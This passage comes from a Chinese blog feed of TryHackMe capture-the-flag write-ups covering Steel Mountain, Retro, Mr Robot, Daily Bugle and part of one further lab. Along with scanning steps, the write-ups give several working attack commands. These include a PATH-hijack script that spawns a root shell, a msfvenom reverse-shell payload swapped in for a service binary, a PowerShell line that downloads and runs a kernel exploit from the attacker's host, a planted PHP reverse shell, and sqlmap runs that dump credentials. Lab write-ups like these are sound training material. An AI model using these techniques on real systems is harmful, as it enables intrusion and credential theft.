2&gt;/dev/null</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015160354842-450932405.png" alt="image-20241015160335569"></p><p>大多数命令都无法利用，但是发现有个不同的文件<code>/home/joe/live_log</code>，可以查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015161626529-819413202.png" alt="image-20241015161615266"></p><p>发现是一个elf文件，运行一下试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015161654143-1177441879.png" alt="image-20241015161642992"></p><p>发现是打印网站的日志的功能</p><p>使用strings检查一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015162050015-1226680986.png" alt="image-20241015162039262"></p><p>检查后发现这个文件在执行的时候会调用<code>tail</code>命令，我们就可以通过劫持该命令进行提权</p><h2 id="劫持环境变量提权"><a href="#劫持环境变量提权" class="headerlink" title="劫持环境变量提权"></a>劫持环境变量提权</h2><p>具体操作如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; /tmp/tail</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt;&gt; /tmp/tail</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/tail</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163243415-624662868.png" alt="image-20241015163231776"></p><p>再运行时，就会按照顺序执行我们构造的<code>tail</code>命令，导致权限提升</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163323308-831948752.png" alt="image-20241015163312818"></p><p>成功提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163355336-310839046.png" alt="image-20241015163344478"></p><p>在<code>/root</code>下找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Steel Mountain</title>
      <link href="/posts/e8bded00.html"/>
      <url>/posts/e8bded00.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.51.252</p></blockquote><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>注意：机器不响应ping命令</strong></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap --min-rate 10000 -Pn -sV -p- 10.10.51.252</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014163927698-310950412.png" alt="image-20241014163917459"></p><p>开放若干端口，但是可以看出这是一台windows主机</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014164050700-679057908.png" alt="image-20241014164041162"></p><p>一个普通的页面，扫下目录</p><p><code>gobuster dir -u http://10.10.51.252/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014170550004-1267980203.png" alt="image-20241014170540647"></p><p>没什么有用信息</p><p>查看下源码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191706066-655513886.png" alt="image-20241014191656687"></p><p>找到人名<code>BillHarper</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><code>smbclient -L //10.10.51.252</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191226841-505937933.png" alt="image-20241014191217373"></p><p>不允许匿名登录</p><h2 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191537845-1876392148.png" alt="image-20241014191528445"></p><p>发现是一个文件服务器版本号是<code>2.3</code>，点进去看看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014192448714-1892990057.png" alt="image-20241014192438848"></p><p>到这里就知道这个服务器的名字了<code>Rejetto HTTP File Server</code></p><p>可以尝试去网上找找是否有历史漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193542336-1095577421.png" alt="image-20241014193532643"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193635486-838603181.png" alt="image-20241014193625312"></p><p>找到个<code>CVE-2014-6287</code></p><h1 id="获取初始访问权限"><a href="#获取初始访问权限" class="headerlink" title="获取初始访问权限"></a>获取初始访问权限</h1><p>启动msf</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193829983-1899085758.png" alt="image-20241014193820488"></p><p>直接搜索这个cve并使用</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014194006026-989143443.png" alt="image-20241014193956689"></p><p>把必要的参数设置一下</p><p>直接run！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014195051743-599602628.png" alt="image-20241014195042124"></p><p>获得基础用户权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014195133488-1609533962.png" alt="image-20241014195123919"></p><p>在<code>C:\Users\bill\Desktop</code>找到<code>user.txt</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><p>这台机器上有了一个初始 shell，我们可以进一步枚举操作系统信息并查看将权限升级到root的利用点，使用<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp</a>的<code>PowerShell</code>脚本来查看这台 Windows 机器并确定目标机是否存在任何异常和错误配置</p><p>将文件保存到本地，通过msf传上去</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014200155434-17085404.png" alt="image-20241014200146045"></p><p>可以通过<code>meterpreter</code>会话来加载<code>PowerShell</code>扩展，并进入 <code>PowerShell</code>的shell界面并执行脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br><span class="line">powershell_shell</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014200617323-413379229.png" alt="image-20241014200607720"></p><p>发现有个特别的服务<code>CanRestart</code>选项被设置为<code>true</code>，当这个选项为<code>true</code>时，我们就能够在系统上重新启动此服务；而且这个应用程序的目录也是可写的，这意味着我们可以用一个恶意应用程序替换合法的应用程序，一旦服务重新启动，我们的恶意程序将运行</p><blockquote><p>ServiceName ：AdvancedSystemCareService9</p><p>ModifiablePath：C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</p></blockquote><p><code>msfvenom</code>可用于生成反向shell的payload并将其输出为<code>windows</code>可执行文件，我们用<code>msfvenom</code>来生成一个和之前的应用程序同名的恶意应用程序:</p><p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.14.90.122 LPORT=4444 -e x86/shikata_ga_nai -f exe -o ASCService.exe</code></p><p>在 <code>meterpreter</code> 中上传文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201549634-483647248.png" alt="image-20241014201539989"></p><p>进入shell，先将这个服务停掉，替换我们的文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">sc</span> stop AdvancedSystemCareService9</span><br><span class="line"><span class="built_in">copy</span> ASCService.exe <span class="string">&quot;C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201806112-808045312.png" alt="image-20241014201756699"></p><p>关于SC命令（Windows shell不区分大小写）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SC</span>命令的格式：<span class="built_in">SC</span> [<span class="type">Servername</span>] command Servicename [<span class="type">Optionname</span>= <span class="type">Optionvalues</span>]</span><br><span class="line"></span><br><span class="line">Servername：指定服务所在的远程服务器的名称。名称必须采用通用命名约定 (UNC) 格式（“\\myserver”）。如果是在本地运行SC.exe，请忽略此参数。</span><br><span class="line">command ：如query,<span class="built_in">start</span>,stop,create,config等</span><br><span class="line"></span><br><span class="line">Servicename：服务名，也就是要配置的那个服务的名字，例如你要启动一个服务你就输入<span class="built_in">sc</span> <span class="built_in">start</span> +你要启动的服务名称（并非是服务显示名称）。</span><br><span class="line">Optionname= Optionvalues：是选项名和选项的值。</span><br></pre></td></tr></table></figure><p>在重启服务之前，在我们的机器上先启动个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201838886-990526090.png" alt="image-20241014201829234"></p><p>然后在靶机中重启服务</p><p><code>sc start AdvancedSystemCareService9</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201912815-1720693336.png" alt="image-20241014201903513"></p><p>这时就提升到了root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014202038317-726923127.png" alt="image-20241014202028946"></p><p>在<code>C:\Users\Administrator\Desktop</code>找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Retro</title>
      <link href="/posts/70f6e376.html"/>
      <url>/posts/70f6e376.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.52.12</p></blockquote><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>注意：机器不响应ping命令</strong></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p> <code>nmap --min-rate 10000 -Pn -sV -p- 10.10.52.12</code></p><p>这里使用<code>-Pn</code>参数绕过ping命令的检查</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012124425580-746515289.png" alt="image-20241012124417135"></p><p>发现只开放了80和3389端口，这意味着当我们拿到一组凭据后，可以通过 rdp登录目标主机</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012125109670-1625718676.png" alt="image-20241012125102563"></p><p>是一个<code>windows server</code>默认的IIS服务</p><p>扫描一下目录</p><p><code>gobuster dir -u http://10.10.52.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012141145765-33043048.png" alt="image-20241012141138353"></p><p>访问一下<code>/retro</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143041958-931600745.png" alt="image-20241012143034753"></p><p>在页面最下面发现文章<code>Ready Player One</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143406701-1000163975.png" alt="image-20241012143359676"></p><p>根据文章意思猜测这是一组登录凭据<code>Wade : parzival</code></p><h1 id="RDP登录远程主机"><a href="#RDP登录远程主机" class="headerlink" title="RDP登录远程主机"></a>RDP登录远程主机</h1><p>拿到一组用户凭据，结合之前的3389端口开放，尝试登录</p><p><code>xfreerdp /u:Wade /p:parzival /cert:ignore /v:10.10.52.12</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143946216-981286449.png" alt="image-20241012143938820"></p><p>登陆成功</p><p>并在桌面找到user.txt</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144100422-25041175.png" alt="image-20241012144053438"></p><h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><p>先进行windows主机信息搜集</p><p>桌面上有个浏览器，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144614643-1652594324.png" alt="image-20241012144607785"></p><p>发现该用户收藏了一个cve的页面，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144928489-1007257350.png" alt="image-20241012144921303"></p><p>是<code>CVE-2019-1388</code></p><p>我们发现目标机的浏览器中有<code>CVE-2019-1388</code>的历史访问记录—猜测用户可能是想针对CVE-2019-1388漏洞打补丁，也就是说目标机器可能存在<code>CVE-2019-1388</code>漏洞</p><p>经过信息搜索可知<code>CVE-2019-1388</code>是一个UAC提权漏洞，该漏洞的基本信息如下：</p><blockquote><p><strong>UAC</strong>:用户帐户控制(User Account Control)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p><p><strong>CVE-2019-1388</strong>：该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。在默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示 Secure Desktop；这些提示是由名为 consent.exe 的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。</p><p>因为用户可以与该UI交互，因此对UI来说紧限制是必须的，否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作，即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。</p><p><a href="https://github.com/jas502n/CVE-2019-1388">CVE-2019-1388漏洞利用</a></p></blockquote><h2 id="利用UAC漏洞提权"><a href="#利用UAC漏洞提权" class="headerlink" title="利用UAC漏洞提权"></a>利用UAC漏洞提权</h2><p>我们需要通过执行<code>hhupd.exe</code>文件来完成对CVE-2019-1388的利用，在目标机用户Wade 桌面上的回收站中我们可以找到<code>hhupd.exe</code>文件——我们手动恢复该文件即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145533318-1767894072.png" alt="image-20241012145525730"></p><p>右键单击hhupd.exe文件并选择以管理员身份运行它，然后先点击”显示更多详细信息”，再继续点击”显示有关发布者证书的信息”</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145637747-550169434.png" alt="image-20241012145630586"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145657684-1224412202.png" alt="image-20241012145647626"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145719391-978453998.png" alt="image-20241012145712577"></p><p><img src="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230308122357026-1060167176.png" alt="image"></p><blockquote><p>如果在上图界面中无法手动选择使用浏览器以打开链接—则需要我们重新部署一个目标机器并在通过RDP运行目标机上的hhupd.exe文件之前 先打开一个IE浏览器实例</p></blockquote><p>因为目标机器没有连接到互联网，所以我们将在<code>Internet Explorer</code>浏览器中看到以下界面（这并不影响漏洞利用过程），此处其实是以系统级别的权限来打开浏览器，我们继续按<code>Alt</code>键弹出程序菜单栏，然后单击”另存为…”</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150200066-2015236866.png" alt="image-20241012150152799"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150347911-676620041.png" alt="image-20241012150339873"></p><p>在弹出的窗口中输入<code>C:\Windows\System32\*.*</code>点击回车，定位到<code>System32</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150458156-990693367.png" alt="image-20241012150451317"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150545579-666682287.png" alt="image-20241012150538624"></p><p>然后在上面输入<code>cmd.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150626890-48998100.png" alt="image-20241012150620038"></p><p>这里正常来说应该是可以提权成功的，但是我这里不知道是哪个步骤出错了，导致没有提权成功。。。</p><h2 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h2><p>通过<code>systeminfo</code>进行信息搜集</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012151549840-1471797610.png" alt="image-20241012151542920"></p><p>发现在这个版本下有 <code>CVE-2017-0213</code>漏洞</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip"> CVE-2017-0213漏洞利用</a></p><p>在kali机中下载以上 zip文件并通过<code>unzip</code>命令解压得到exe，然后传输该exe文件到靶机中，最后通过远程桌面直接执行该exe文件即可成功提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012152613938-1409594014.png" alt="image-20241012152606663"></p><p>起一个python服务</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012152654989-441442532.png" alt="image-20241012152648189"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在靶机cmd中使用Powershell的Invoke-WebRequest模块</span></span><br><span class="line">Powershell <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> http://<span class="number">10.14</span>.<span class="number">90.122</span>:<span class="number">81</span>/CVE<span class="literal">-2017-0213_x64</span>.exe <span class="literal">-OutFile</span> exploit.exe</span><br><span class="line"></span><br><span class="line">.\exploit.exe</span><br><span class="line"><span class="comment">#执行漏洞利用exe之后，我们能看到该漏洞利用程序生成了一个新的CMD shell且权限为Administrator——提权成功。</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012154001467-1487303658.png" alt="image-20241012153954000"></p><p>提权成功，拿到<code>system</code>权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012154050259-1805537077.png" alt="image-20241012154043442"></p><p>在<code>c:/Users/Administrator/Desktop</code>找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Mr Robot CTF</title>
      <link href="/posts/9f5f1768.html"/>
      <url>/posts/9f5f1768.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.202.26</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.202.26</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009200958952-1307236102.png" alt="image-20241009200954547"></p><p>发现22，80等端口，但是ssh服务关闭了</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009201526558-368574539.png" alt="image-20241009201522229"></p><p>默认页面是一个类似于linux终端的界面，正常的命令执行不了，只能执行页面提供的命令</p><p>每个命令都测试了一下，并没有什么她特别重要的信息，先扫描一下目录</p><p><code>gobuster dir -u http://10.10.202.26/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203017797-1719379315.png" alt="image-20241009203013287"></p><p>结果很多，但是可以看出来这是一个<code>wordpress</code>的站</p><h1 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h1><p>先查看一下哎<code>robots.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203649868-7394202.png" alt="image-20241009203645784"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203728050-509535539.png" alt="image-20241009203724196"></p><p>找到第一个<code>key</code></p><p>另一个文件<code>fsocity.dic</code>访问后自动下载了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009204040584-1051975220.png" alt="image-20241009204036224"></p><p>打开后是个字典</p><p>接着访问扫描出来的结果时，发现在<code>/license</code>文件下有信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009204827064-1879933782.png" alt="image-20241009204822920"></p><p>很像<code>base64</code>编码，解码试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009205002306-1782867748.png" alt="image-20241009204958248"></p><p>得到一个用户名密码：<code>elliot:ER28-0652</code></p><p>尝试登陆<code>wordpress</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009205219208-88514281.png" alt="image-20241009205215191"></p><p>没想到这是个admn用户，赚翻啦</p><p>直接kali监听一手</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009210509904-1918358012.png" alt="image-20241009210505770"></p><p>将准备好的<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a>写在<code>404.php</code>上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009212111435-983517017.png" alt="image-20241009212106883"></p><p>设置好ip和port后保存</p><p>浏览器访问<code>http://10.10.202.26/theme/twentyfifteen/404.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009212848299-908977679.png" alt="image-20241009212844443"></p><p>拿到初始权限</p><h1 id="提升至user权限"><a href="#提升至user权限" class="headerlink" title="提升至user权限"></a>提升至user权限</h1><p>切换交互式shell</p><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213103248-2017368856.png" alt="image-20241009213059186"></p><p><code>/home</code>下有<code>robot</code>用户，进入之后发现第二个<code>key</code>，但是我们查看不了，我们能查看另一个文件，根据其内容可以判断出这是<code>robot</code>的用户名和密码</p><p>将密码保存到文件<code>hash</code>中，用<code>hashcat</code>离线破解试试</p><p><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213509026-1986403223.png" alt="image-20241009213504820"></p><p>破解成功，拿到<code>robot</code>用户的明文密码<code>abcdefghijklmnopqrstuvwxyz</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213616619-415158260.png" alt="image-20241009213612441"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213650967-1591154118.png" alt="image-20241009213647123"></p><p>拿到第二个<code>key</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><p>先尝试<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214047420-696985946.png" alt="image-20241009214043116"></p><p>ok，不让用</p><p>用<code>find</code>查一下特权命令</p><p><code>find / -perm -u=s -type f 2&gt; /dev/null</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214115004-1182315555.png" alt="image-20241009214110829"></p><p>发现有<code>nmap</code>，可以利用<code>nmap</code>提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214602683-1592532035.png" alt="image-20241009214558352"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214644568-905281974.png" alt="image-20241009214640433"></p><p>在<code>/root</code>目录下找到最后一个<code>key</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Daily Bugle</title>
      <link href="/posts/4b5f600a.html"/>
      <url>/posts/4b5f600a.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.158.159</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap --min-rate 10000 -p- -sV -sC 10.10.158.159 -oN reports/nmap</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008133602854-1151410066.png" alt="image-20241008133559967"></p><p>发现有22，80，3306端口开放，并且在80端口上有<code>robots.txt</code>，开启了mysql服务</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135115833-1217847155.png" alt="image-20241008135112969"></p><p>页面貌似没什么信息，扫描一下目录</p><p><code>gobuster dir -u http://10.10.158.159/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135616416-1722312870.png" alt="image-20241008135614061"></p><p>先看下<code>robots.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135637011-1331873752.png" alt="image-20241008135634589"></p><p>综上来看这是一个<code>joomla CMS</code>，目录访问后并没有发现什么信息</p><h1 id="SQL漏洞利用"><a href="#SQL漏洞利用" class="headerlink" title="SQL漏洞利用"></a>SQL漏洞利用</h1><p>使用<code>joomscan</code>测试一下</p><p><code>joomscan -u http://10.10.158.159/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141255235-581479402.png" alt="image-20241008141252485"></p><p>发现版本是3.7.0，搜索一下是否有可以利用的漏洞</p><p><code>searchsploit joomla 3.7.0</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141440663-205205108.png" alt="image-20241008141438525"></p><p>发现在该版本存在sql注入，将文件复制下来查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141545963-1681767930.png" alt="image-20241008141543468"></p><p>这里写了使用<code>sqlmap</code>工具进行sql注入，直接照着弄就行</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008143755357-1634909799.png" alt="image-20241008143752393"></p><p>利用成功，得到数据库，继续爆破表</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]</code> </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008144208470-98185412.png" alt="image-20241008144206265"></p><p>得到很多表，我们重点看<code>users</code>表，先查看字段的值</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &#39;#__users&#39; --columns -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008144831007-655266633.png" alt="image-20241008144828658"></p><p>选项直接正常选就行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008150239571-1068282498.png" alt="image-20241008150237274"></p><p>漫长等待后也是把字段爆破出来了，我们重点看用户名和密码</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &#39;#__users&#39; -C username,password --dump -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008150415433-886794507.png" alt="image-20241008150413037"></p><p>成功拿到了一组凭据</p><p><code>jonah : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm</code></p><p>密码是加密数据，这里使用<code>john</code>破解，先将密码保存至<code>hash</code></p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152021738-1397311919.png" alt="image-20241008152018882"></p><p>得到<code>jonah</code>用户的明文密码<code>spiderman123</code></p><p>登录<code>joomla</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152334179-1197770814.png" alt="image-20241008152331521"></p><p>登陆成功</p><h1 id="获得初始权限"><a href="#获得初始权限" class="headerlink" title="获得初始权限"></a>获得初始权限</h1><p>查看后发现可以通过改写模板文件的内容getshell</p><p>首先点击右侧<code>Template</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152509620-2024984243.png" alt="image-20241008152507304"></p><p>再点击右侧的<code>Template</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152709570-776349238.png" alt="image-20241008152706921"></p><p>选第一个<code>Beez3</code></p><p><img 